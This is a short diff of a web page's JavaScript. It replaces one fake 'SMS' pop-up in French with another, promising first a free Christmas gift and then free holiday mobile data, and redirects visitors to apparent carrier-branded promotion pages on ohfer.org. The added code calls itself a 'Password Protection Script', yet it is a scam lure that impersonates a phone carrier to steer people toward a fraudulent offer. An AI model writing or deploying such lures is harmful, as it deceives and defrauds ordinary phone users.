@@ -1,5 +1,10 @@
-var password = 'OBTENIR UNE OFFRE'
-password=prompt('SMS: Félicitations, votre numéro orange vous permet de recevoir un cadeau de Noël gratuit. Cliquez sur OK pour le recevoir.','OBTENIR UNE OFFRE');
-if (password != 'OBTENIR UNE OFFRE') {
-location.href='https://ohfer.org/vodacom-xmas.html';
+  
+/* Password Protection Script by www.onlineofferz.xyz*/
+var password = 'ACTIVER'
+password = prompt(
+  'SMS: Félicitations ! Votre numéro de téléphone est éligible pour recevoir les données de Noël et du Nouvel An. Appuyez sur OK pour activer..',
+  'ACTIVER'
+);
+if (password != 'ACTIVER') {
+  location.href = 'https://ohfer.org/drc-xmas.html';
 }
